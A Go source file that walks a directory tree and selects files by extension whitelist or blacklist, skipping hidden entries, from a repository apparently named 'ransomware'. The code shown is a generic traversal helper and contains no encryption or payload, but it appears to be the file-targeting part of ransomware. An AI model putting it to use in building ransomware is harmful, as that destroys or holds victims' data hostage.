package fs

import (
	iofs "io/fs"
	"path/filepath"

	"github.com/marmos91/ransomware/utils"
)

func WalkFilesWithExtFilter(path string, extBlacklist []string, extWhitelist []string, skipHidden bool, callback func(path string, info iofs.FileInfo) error) error {
	return filepath.Walk(path, func(currentPath string, currentInfo iofs.FileInfo, err error) error {
		if err != nil {
			return err
		}

		isHidden, err := IsHidden(currentPath)
		if err != nil {
			return err
		}

		if skipHidden && isHidden {
			if currentInfo.IsDir() {
				return filepath.SkipDir
			}
			return nil
		}

		if currentInfo.IsDir() {
			return nil
		}

		if currentInfo.IsDir() {
			return nil
		}

		if !shouldProcess(currentPath, extWhitelist, extBlacklist) {
			return nil
		}

		return callback(currentPath, currentInfo)
	})
}

func shouldProcess(path string, whitelist []string, blacklist []string) bool {
	ext := filepath.Ext(path)

	if hasNonEmptyEntry(whitelist) {
		return utils.SliceContains(whitelist, ext)
	}

	if hasNonEmptyEntry(blacklist) {
		return !utils.SliceContains(blacklist, ext)
	}

	return true
}

func hasNonEmptyEntry(list []string) bool {
	for _, s := range list {
		if s != "" {
			return true
		}
	}
	return false
}
